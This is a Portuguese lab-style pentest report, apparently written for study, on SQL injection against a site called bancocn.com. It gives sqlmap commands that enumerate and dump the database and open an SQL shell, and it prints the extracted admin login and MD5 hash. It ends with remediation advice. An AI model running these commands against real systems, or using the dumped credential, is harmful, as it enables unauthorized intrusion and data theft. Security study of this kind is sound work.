# Relatório Técnico – SQL Injection (SQLi)

## Alvo

```
http://www.bancocn.com/cat.php?id=1
```

---

## 1. Comandos Executados

### Detecção de SQL Injection

```bash
sqlmap -u http://www.bancocn.com/cat.php?id=1 -p id --dbms=mysql
```

### Enumeração de tabelas do banco

```bash
sqlmap -u http://www.bancocn.com/cat.php?id=1 -p id -D bancocn --tables
```

### Enumeração de colunas da tabela users

```bash
sqlmap -u http://www.bancocn.com/cat.php?id=1 -p id -D bancocn -T users --columns
```

### Dump da tabela users

```bash
sqlmap -u http://www.bancocn.com/cat.php?id=1 -p id -D bancocn -T users --dump
```

### Dump da tabela pictures

```bash
sqlmap -u http://www.bancocn.com/cat.php?id=1 -D bancocn -T pictures --dump
```

### Acesso ao SQL Shell

```bash
sqlmap -u "http://www.bancocn.com/cat.php?id=1" --sql-shell
```

---

## 2. Resultados Obtidos

### 2.1 Vulnerabilidade Identificada

* **Tipo:** SQL Injection (SQLi)
* **Parâmetro vulnerável:** `id` (GET)
* **Banco de dados:** MySQL (MariaDB fork)
* **Técnicas confirmadas:**

  * Error-based
  * Time-based blind
  * UNION-based
* **Quantidade de colunas detectadas:** 3

---

### 2.2 Informações do Servidor

* **Sistema Operacional:** Linux Ubuntu
* **Tecnologia Web:** PHP 5.6.40
* **DBMS:** MariaDB 10.1.44
* **Usuário do banco:** `bancocn@localhost`
* **Diretório de dados:** `/var/lib/mysql/`

---

### 2.3 Banco de Dados Identificado

```
bancocn
```

---

### 2.4 Tabelas do Banco `bancocn`

```
categories
pictures
stats
users
```

---

### 2.5 Estrutura da Tabela `users`

| Coluna   | Tipo         |
| -------- | ------------ |
| id       | mediumint(9) |
| login    | varchar(50)  |
| password | varchar(50)  |

---

### 2.6 Dados Extraídos da Tabela `users`

| id | login | password (hash)                  |
| -- | ----- | -------------------------------- |
| 1  | admin | 7b71be0e85318117d2e514ce2a2e222c |

* O campo `password` foi identificado como **hash MD5**
* Tentativa de quebra utilizando wordlist padrão **sem sucesso**

---

### 2.7 Estrutura e Dados da Tabela `pictures`

| id | cat | img                                | title   |
| -- | --- | ---------------------------------- | ------- |
| 1  | 7   | dsc_0699-min.jpg                   | estatua |
| 2  | 4   | 1490906279.jpg                     | predios |
| 3  | 6   | north-korea-science-technology.jpg | foguete |

---

### 2.8 Consultas Executadas via SQL Shell

```sql
SELECT DATABASE();
SELECT * FROM users;
SELECT @@version;
SELECT @@datadir;
SELECT @@secure_file_priv;
```

---

## 3. Avaliação de Impacto

* **Comprometimento total do banco de dados:** Confirmado
* **Exposição de credenciais:** Confirmada
* **Possibilidade de escalonamento (pivot):** Dependente de permissões adicionais
* **Gravidade:** ALTA

---

## 4. Conclusão Técnica

A aplicação apresenta uma falha crítica de SQL Injection causada pela ausência de validação e sanitização adequada de parâmetros de entrada. A utilização de tecnologias obsoletas (PHP 5.6 e MariaDB antigo) agrava significativamente o risco.

Este tipo de vulnerabilidade permite:

* Enumeração completa do banco
* Extração de dados sensíveis
* Possível comprometimento do servidor

A correção deve envolver validação de entrada, uso de prepared statements e atualização do stack tecnológico.

---

**Relatório gerado para fins de estudo e demonstração técnica.**
